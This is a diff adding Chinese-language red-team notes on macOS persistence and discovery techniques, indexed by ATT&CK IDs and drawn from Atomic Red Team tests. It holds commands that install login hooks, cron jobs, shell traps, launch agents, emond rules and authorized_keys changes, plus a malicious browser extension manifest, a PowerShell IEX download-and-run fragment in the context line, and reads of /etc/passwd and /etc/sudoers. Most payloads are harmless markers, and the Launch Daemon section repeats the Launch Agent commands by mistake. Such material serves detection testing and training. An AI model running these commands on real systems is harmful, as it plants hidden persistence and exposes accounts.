@@ -295,4 +295,383 @@ set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net
 Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
 ```
 迎还没问题,没有复现
-### T1137 - Office Application Startup
+
+## macos
+
+## T1037.002 - Logon Script
+
+红队一种持久化的方法之一，demo如下
+
+1. 创建一个plist文件
+
+   ```
+   sudo touch /private/var/root/Library/Preferences/com.apple.loginwindow.plist
+   ```
+
+2. 在plist中填写shellcode的地址
+
+   ```
+   sudo defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh
+   ```
+
+3. 在目标用户中创建特定的plist文件
+
+   ```
+   touch /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
+   ```
+
+4. 在该plist中填充文件
+
+   ```
+   defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh
+   ```
+
+   
+
+## T1546.004 - .bash_profile and .bashrc
+
+红队可以在`~/.bash_profile` 和 `~/.bashrc`中创建命令，并通过用户调起shell来运行红队存储的恶意指令。
+
+`/.bash_profile`在用户登陆后运行，`/.bashrc`运行在shell启动时，Demo如下
+
+**Demo 1 Add command to .bash_profile**
+
+```
+echo "#{command_to_add}" >> ~/.bash_profile
+```
+
+**Demo2  Add command to .bashrc**
+
+```
+echo "#{command_to_add}" >> ~/.bashrc
+```
+
+## T1176 - Browser Extensions
+
+有些恶意软件是通过浏览器扩展的形式贮存在客户端上,而这些恶意
+
+###### Demo 1 Chrome (Developer Mode)
+
+1. 打开chrome://extensions 并选择开发者模式
+2. 加载已解压的扩展程序
+
+##### Demo 2 Chrome (Chrome Web Store)
+
+1. 在chrome中打开`https://chrome.google.com/webstore/detail/minimum-viable-malicious/odlpfdolehmhciiebahbpnaopneicend`
+2. 点击’Add to Chrome’
+
+##### Demo 3 FireFox
+
+1. Navigate to about:debugging and click “Load Temporary Add-on”
+2. Navigate to manifest.json
+3. Then click ‘Open’
+
+其中manifest.json
+
+```
+{
+  "name": "Minimum Viable Malicious Extension",
+  "description": "Base Level Extension",
+  "version": "1.0",
+  "manifest_version": 2,
+  "content_scripts": [
+    {
+      "matches": [
+        "<all_urls>"
+      ],
+      "js": [
+        "inline.js"
+      ]
+    }
+  ]
+}
+```
+
+### T1053.003 - Cron
+
+红队可以利用cron来进行任务调度，执行恶意代码。cron是类Unix系统基于时间的调度工具集。crontab文件包含了任务调度的实体。红队通常使用cron来进行持久化、程序执行或者是横向移动。
+
+**Demo1 替换cron指向的文件**
+
+这个demo替换了用户的crontab文件，这项技术应用在多个IOT自动化攻击中
+
+```
+crontab -l > /tmp/notevil
+echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
+```
+
+**Demo2 在cron的文件夹中添加任务**
+
+这个demo在cron文件夹中配置调度任务，demo如下
+
+```
+echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.daily/#persistevil
+```
+
+## T1546.005 - Trap
+
+Trap命令允许程序和shell在收到interrupt命令后执行特定的命令.一种常见的情况是脚本允许终止和处理常见的键盘中断，如`ctrl+c`和`ctrl+d`,攻击者可以利用这点来注册代码,当shell被打断的时候运行.trap的格式是`trap 'command list' signals` 这表示程序收到signals时运行command list.
+
+**Demo**
+
+```
+trap "nohup echo-art-fish.sh | bash" EXIT
+exit
+trap "nohup echo-art-fish.sh | bash" SIGINt
+```
+
+其中sh内容如下
+
+```
+#! /bin/bash
+echo So long, and thanks for all the fish! > /tmp/art-fish.txt
+```
+
+## T1037.005 - Startup Items
+
+还是通过`[Launch Daemon]`实现的自启动，只不过文件夹在`/Library/StartupItems`，Demo如下
+
+```
+sudo touch /Library/StartupItems/EvilStartup.plist
+```
+
+## T1547.007 - Re-opened Applications
+
+简而言之就是修改`~/Library/Preferences/com.apple.loginwindow.plist` 和 `~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist`中指向的文件来实现持久化，
+
+Demo如下
+
+```
+sudo defaults write com.apple.loginwindow LoginHook #{script}
+```
+
+## T1037.004 - Rc.common
+
+macOS在启动的过程中会执行`source /etc/rc.common`，红队可以根据这个特性，使用rc.common进行持久化，Demo如下
+
+```
+sudo echo osascript -e 'tell app "Finder" to display dialog "Hello World"' >> /etc/rc.common
+```
+
+## T1098.004 - SSH Authorized Keys
+
+红队可以修改`authorized_keys`文件实现持久化，其实就是修改`<user-home>/.ssh/authorized_keys`文件，添加一个自己密钥
+
+验证用户是否有权限修改该文件的Demo如下
+
+```
+if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo $ssh_authorized_keys > ~/.ssh/authorized_keys; fi;
+```
+
+
+
+## T1546.014 - Emond
+
+红队可以通过修改Event Monitor Daemon (emond)的规则，等待用户触发，来实现持久化和提权.Emond是一个守护进程，接收各个服务发来的events，并通过简单的规则来进行进一步操作。这个文件`/sbin/emond`加载的规则目录在这里：`/etc/emond.d/rules/`
+
+Demo如下
+
+```
+sudo cp T1546.014_emond.plist /etc/emond.d/rules/T1546.014_emond.plist
+sudo touch /private/var/db/emondClients/T1546.014
+```
+
+其中T1546.014_emond.plist内容如下
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<array>
+	<dict>
+		<key>name</key>
+		<string>AtomicRedTeam_T1546_014</string>
+        <key>enabled</key>
+        <true/>
+        <key>eventTypes</key>
+        <array>
+            <string>startup</string>
+        </array>
+        <key>actions</key>
+        <array>
+            <dict>
+                <key>command</key>
+                <string>/usr/bin/sleep</string>
+                <key>user</key>
+                <string>root</string>
+                <key>arguments</key>
+                    <array>
+                        <string>10</string>
+                    </array>
+                <key>type</key>
+                <string>RunCommand</string>
+            </dict>
+            <dict>
+                <key>command</key>
+                <string>/usr/bin/touch</string>
+                <key>user</key>
+                <string>root</string>
+                <key>arguments</key>
+                    <array>
+                        <string>/tmp/T1546_014_atomicredteam</string>
+                    </array>
+                <key>type</key>
+                <string>RunCommand</string>
+            </dict>
+        </array>
+    </dict>
+</array>
+</plist>
+```
+
+## T1543.001 - Launch Agent
+
+红队可以通过创建或修改launch agents来实现持久化，每当有用户登陆，系统会运行/System/Library/LaunchAgents`, `/Library/LaunchAgents`, 和$HOME/Library/LaunchAgents这里的plist，Demo如下
+
+```
+if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
+sudo cp atomicredteam_T1543_001.plist ~/Library/LaunchAgents/com.atomicredteam.plist
+sudo launchctl load -w ~/Library/LaunchAgents/com.atomicredteam.plist
+```
+
+其中atomicredteam_T1543_001.plist
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>Label</key>
+  <string>com.atomicredteam.t1543_001</string>
+  <key>ProgramArguments</key>
+  <array>
+  <string>touch</string>
+  <string>/tmp/T1543_001_atomicredteam.txt</string>
+  </array>
+  <key>RunAtLoad</key>
+  <true/>
+  <key>NSUIElement</key>
+  <string>1</string>
+</dict>
+</plist>
+```
+
+## T1543.004 - Launch Daemon
+
+红队可以创建或者修改一个launch daemons来重复运行恶意的payload来进行持久化。当macOS系统启动的时候，launchd会启动来完成初始化。这个进程从plist文件中加载每一个守护进程。
+
+```
+if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
+sudo cp atomicredteam_T1543_001.plist ~/Library/LaunchAgents/com.atomicredteam.plist
+sudo launchctl load -w ~/Library/LaunchAgents/com.atomicredteam.plist
+```
+
+其中atomicredteam_T1543_001.plist
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>Label</key>
+  <string>com.atomicredteam.t1543_001</string>
+  <key>ProgramArguments</key>
+  <array>
+  <string>touch</string>
+  <string>/tmp/T1543_001_atomicredteam.txt</string>
+  </array>
+  <key>RunAtLoad</key>
+  <true/>
+  <key>NSUIElement</key>
+  <string>1</string>
+</dict>
+</plist>
+```
+
+## T1053.004 - Launchd
+
+红队可以使用Launchd来调度或者运行恶意代码.其中launchd守护进程的作用就是加载和维持系统的服务，该进程加载的plist参数分别来自`/System/Library/LaunchDaemons` 和 `/Library/LaunchDaemons` 
+
+红队可以使用macos中的launchd来调度启动文件夹下的可执行文件用来进行持久化，launchd也可以指定特定的用户运行程序
+
+**Demo1 创建事件监听守护进程（Event Monitor Daemon）来持久化**
+
+这个Demo通过修改plist来实现持久化
+
+```
+sudo cp a.plist /etc/emond.d/rules/atomicredteam_T1053_004.plist
+sudo touch /private/var/db/emondClients/randon  #Random name of the empty file used to trigger emond service
+```
+
+其中a.plist内容如下
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<array>
+    <dict>
+        <key>name</key>
+        <string>com.atomicredteam.t1053_004</string>
+        <key>enabled</key>
+        <true/>
+        <key>eventTypes</key>
+        <array>
+            <string>startup</string>
+        </array>
+        <key>actions</key>
+        <array>
+            <dict>
+                <key>command</key>
+                <string>/usr/bin/sleep</string>
+                <key>user</key>
+                <string>root</string>
+                <key>arguments</key>
+                    <array>
+                        <string>10</string>
+                    </array>
+                <key>type</key>
+                <string>RunCommand</string>
+            </dict>
+            <dict>
+                <key>command</key>
+                <string>/usr/bin/touch</string>
+                <key>user</key>
+                <string>root</string>
+                <key>arguments</key>
+                    <array>
+                        <string>/tmp/T1053_004_atomicredteam</string>
+                    </array>
+                <key>type</key>
+                <string>RunCommand</string>
+            </dict>
+        </array>
+    </dict>
+</array>
+</plist>
+```
+
+## T1087.001 - Local Account
+
+一些查找本地用户的方法
+
+```
+cat /etc/passwd
+```
+
+查看suder
+
+```
+sudo cat /etc/sudoers
+```
+
+枚举用户名和用户组
+
+```
+dscl . list /Groups
+dscl . list /Users
+dscl . list /Users | grep -v '_'
+dscacheutil -q group
+dscacheutil -q user
+```
+
